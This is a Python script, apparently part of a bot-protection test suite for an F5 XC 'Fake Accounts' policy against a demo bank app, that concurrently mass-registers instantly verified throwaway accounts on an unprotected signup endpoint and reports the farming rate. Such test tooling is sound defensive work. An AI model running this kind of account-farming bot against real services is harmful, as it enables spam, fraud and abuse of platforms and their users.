"""
fake_account_farming.py — mass-register throwaway accounts at speed.

Vuln / bot scenario:  POST /api/auth/register creates an INSTANTLY-VERIFIED
                      account with no email confirmation, no CAPTCHA, and no
                      signup rate limit — so a bot can farm verified accounts as
                      fast as the network allows.
F5 XC category:       Bot Protection: Fake Accounts.

Each account gets a unique random email so runs never collide. Reports the
accounts-per-second rate, which is the headline metric a Fake-Accounts policy is
meant to crush.

Usage:
    python3 fake_account_farming.py                     # 25 accounts
    python3 fake_account_farming.py --count 100 --concurrency 12
"""

import argparse
import os
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import BASE_URL, DEFAULT_CONCURRENCY, make_client


def register_one(client) -> tuple[bool, str]:
    email = f"farm-{uuid.uuid4().hex[:12]}@nimbusbank.io"
    try:
        r = client.post("/api/auth/register", json={
            "email": email, "full_name": "Farmed Account",
            "password": "password123", "ssn_last4": "4242",
        })
    except Exception as exc:  # noqa: BLE001
        return False, f"{email} ERR {exc}"
    if r.status_code == 201:
        verified = r.json().get("user", {}).get("is_verified")
        return True, f"{email} (verified={verified})"
    return False, f"{email} -> {r.status_code} {r.text[:80]}"


def main():
    ap = argparse.ArgumentParser(description="Fake-account farming bot.")
    ap.add_argument("--count", type=int, default=25, help="how many accounts to create")
    ap.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
    args = ap.parse_args()

    print(f"Target: {BASE_URL}/api/auth/register")
    print(f"farming {args.count} accounts, concurrency={args.concurrency}\n")

    created, failed, sample = 0, 0, []
    start = time.time()
    with make_client() as client:
        with ThreadPoolExecutor(max_workers=args.concurrency) as pool:
            futs = [pool.submit(register_one, client) for _ in range(args.count)]
            for fut in as_completed(futs):
                ok, desc = fut.result()
                if ok:
                    created += 1
                    if len(sample) < 5:
                        sample.append(desc)
                else:
                    failed += 1
                    print(f"  FAIL  {desc}")

    elapsed = time.time() - start
    rate = created / elapsed if elapsed else 0
    print("--- report ---")
    print(f"created:   {created}/{args.count}  (failed {failed})")
    print(f"elapsed:   {elapsed:.2f}s")
    print(f"rate:      {rate:.1f} verified accounts/sec")
    print("sample created accounts (all instantly verified, no email/CAPTCHA):")
    for s in sample:
        print(f"  {s}")


if __name__ == "__main__":
    main()
